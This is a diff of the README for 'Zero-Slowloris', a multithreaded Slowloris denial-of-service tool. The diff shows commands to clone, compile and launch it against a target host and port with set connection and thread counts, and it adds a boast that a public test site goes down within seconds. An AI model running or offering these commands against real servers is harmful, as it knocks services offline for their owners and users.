@@ -10,10 +10,9 @@ git clone https://github.com/MalikShoaib678/Zero-Slowloris
 g++ Zero-Slowloris.cxx -o zerodos
 ./zerodos www.example.com 80 1000 200
 
+# Last performance test:
+*testphp.vulnweb.com* goes down in under *10* seconds, using only *4* CPU cores
 
-#try turbo one ..It is more powerfull..
-./Turbo-ZeroSlowloris www.example.com 80 1000 200
-```
 ## Features
 
 * **Multithreading:** ZeroSlowloris utilizes multiple threads to establish connections, significantly improving the speed and efficiency of the attack.
